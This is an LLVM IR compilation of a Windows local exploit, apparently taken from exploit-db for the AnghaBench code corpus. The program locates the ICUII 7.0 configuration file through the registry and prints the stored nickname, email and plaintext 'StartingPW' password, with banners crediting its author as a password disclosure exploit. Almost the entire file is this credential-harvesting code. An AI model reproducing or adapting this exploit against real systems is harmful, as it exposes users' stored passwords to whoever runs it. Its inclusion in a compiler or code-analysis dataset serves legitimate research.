; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_965.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_965.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HKEY_LOCAL_MACHINE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [42 x i8] c"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\00", align 1
@KEY_QUERY_VALUE = common dso_local global i32 0, align 4
@hKey = common dso_local global i32 0, align 4
@ERROR_SUCCESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [16 x i8] c"ProgramFilesDir\00", align 1
@prgfiles = common dso_local global i64 0, align 8
@dwBufLen = common dso_local global i64 0, align 8
@lRet = common dso_local global i64 0, align 8
@BUFSIZE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [19 x i8] c"An error occured!\0A\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c"\\icuii\\icuii.ini\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"NickName=\00", align 1
@.str.5 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.6 = private unnamed_addr constant [40 x i8] c"ICUII is not installed on your system!\0A\00", align 1
@.str.7 = private unnamed_addr constant [54 x i8] c"ICUII 7.0 Local Password Disclosure Exploit by Kozan\0A\00", align 1
@.str.8 = private unnamed_addr constant [19 x i8] c"Credits to ATmaCA\0A\00", align 1
@.str.9 = private unnamed_addr constant [46 x i8] c"www.netmagister.com - www.spyinstructors.com\0A\00", align 1
@.str.10 = private unnamed_addr constant [24 x i8] c"kozan@netmagister.com\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [14 x i8] c"Nickname: %s\0A\00", align 1
@.str.12 = private unnamed_addr constant [14 x i8] c"Location: %s\0A\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"Location=\00", align 1
@.str.14 = private unnamed_addr constant [14 x i8] c"Comment : %s\0A\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"Comment=\00", align 1
@.str.16 = private unnamed_addr constant [14 x i8] c"E-Mail  : %s\0A\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"Email=\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"Password: %s\0A\00", align 1
@.str.19 = private unnamed_addr constant [12 x i8] c"StartingPW=\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %2 = load i32, i32* @HKEY_LOCAL_MACHINE, align 4
  %3 = load i32, i32* @KEY_QUERY_VALUE, align 4
  %4 = call i64 @RegOpenKeyEx(i32 %2, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str, i64 0, i64 0), i32 0, i32 %3, i32* @hKey)
  %5 = load i64, i64* @ERROR_SUCCESS, align 8
  %6 = icmp eq i64 %4, %5
  br i1 %6, label %7, label %26

7:                                                ; preds = %0
  %8 = load i32, i32* @hKey, align 4
  %9 = load i64, i64* @prgfiles, align 8
  %10 = trunc i64 %9 to i32
  %11 = call i64 @RegQueryValueEx(i32 %8, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i32* null, i32* null, i32 %10, i64* @dwBufLen)
  store i64 %11, i64* @lRet, align 8
  %12 = load i64, i64* @lRet, align 8
  %13 = load i64, i64* @ERROR_SUCCESS, align 8
  %14 = icmp ne i64 %12, %13
  br i1 %14, label %19, label %15

15:                                               ; preds = %7
  %16 = load i64, i64* @dwBufLen, align 8
  %17 = load i64, i64* @BUFSIZE, align 8
  %18 = icmp sgt i64 %16, %17
  br i1 %18, label %19, label %23

19:                                               ; preds = %15, %7
  %20 = load i32, i32* @hKey, align 4
  %21 = call i32 @RegCloseKey(i32 %20)
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %54

23:                                               ; preds = %15
  %24 = load i32, i32* @hKey, align 4
  %25 = call i32 @RegCloseKey(i32 %24)
  br label %26

26:                                               ; preds = %23, %0
  %27 = load i64, i64* @prgfiles, align 8
  %28 = call i32 @strcat(i64 %27, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  %29 = load i64, i64* @prgfiles, align 8
  %30 = call i8* @oku(i64 %29, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %31 = icmp eq i8* %30, getelementptr inbounds ([1 x i8], [1 x i8]* @.str.5, i64 0, i64 0)
  br i1 %31, label %32, label %34

32:                                               ; preds = %26
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %54

34:                                               ; preds = %26
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.7, i64 0, i64 0))
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.8, i64 0, i64 0))
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.9, i64 0, i64 0))
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.10, i64 0, i64 0))
  %39 = load i64, i64* @prgfiles, align 8
  %40 = call i8* @oku(i64 %39, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %41 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.11, i64 0, i64 0), i8* %40)
  %42 = load i64, i64* @prgfiles, align 8
  %43 = call i8* @oku(i64 %42, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0))
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.12, i64 0, i64 0), i8* %43)
  %45 = load i64, i64* @prgfiles, align 8
  %46 = call i8* @oku(i64 %45, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0))
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.14, i64 0, i64 0), i8* %46)
  %48 = load i64, i64* @prgfiles, align 8
  %49 = call i8* @oku(i64 %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.17, i64 0, i64 0))
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.16, i64 0, i64 0), i8* %49)
  %51 = load i64, i64* @prgfiles, align 8
  %52 = call i8* @oku(i64 %51, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.19, i64 0, i64 0))
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i64 0, i64 0), i8* %52)
  store i32 0, i32* %1, align 4
  br label %54

54:                                               ; preds = %34, %32, %19
  %55 = load i32, i32* %1, align 4
  ret i32 %55
}

declare dso_local i64 @RegOpenKeyEx(i32, i8*, i32, i32, i32*) #1

declare dso_local i64 @RegQueryValueEx(i32, i8*, i32*, i32*, i32, i64*) #1

declare dso_local i32 @RegCloseKey(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strcat(i64, i8*) #1

declare dso_local i8* @oku(i64, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
